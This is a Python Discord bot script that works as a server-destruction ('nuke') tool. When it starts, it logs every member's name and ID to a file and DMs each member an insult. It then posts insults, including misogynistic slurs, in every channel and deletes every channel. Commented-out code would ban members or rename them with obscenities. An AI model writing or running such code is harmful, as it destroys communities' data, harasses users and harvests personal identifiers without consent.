import discord
from discord.ext import commands

from time import sleep
from random import *
import sys

intents = discord.Intents.default()
intents.members = True

# Start event handling and bot creation
bot = commands.Bot(
    command_prefix=commands.when_mentioned_or("-"),
    description="It's always gamer hour",
    intents=intents,
)

def log(stuff):
    print(stuff)
    with open("data.txt", "a+") as f:
        f.write(stuff + "\n")

messages = ["troll", "kekw", "lol", "xd", "you're a hoe", "you're a whore"]

@bot.event
async def on_ready():
    log("Am online")

    for g in bot.guilds:
        log("Start of " + g.name + ", id: " + str(g.id))
        async for lad in g.fetch_members():
            log("- Member: " + lad.name + " # " + lad.discriminator + " , ID: " + str(lad.id))
            try:
                await lad.send("You suck!")
            except:
                print("Failed to DM")

            #try:
            #    await g.ban(lad)
            #except:
            #    log("Failed to ban. Trying to rename.")
            #    try:
            #        await lad.edit(nick="Fuckhead")
            #    except:
            #        log("Failed to rename. sorry :,(")

        for channel in await g.fetch_channels():
            log("Trying to delete " + str(channel.name))
            try:
                await channel.send(choice(messages))
            except:
                pass
            try:
                await channel.delete()
            except Exception as e:
                print("Failed to delete " + str(channel.name) + " because: " + str(e))

bot.run("")
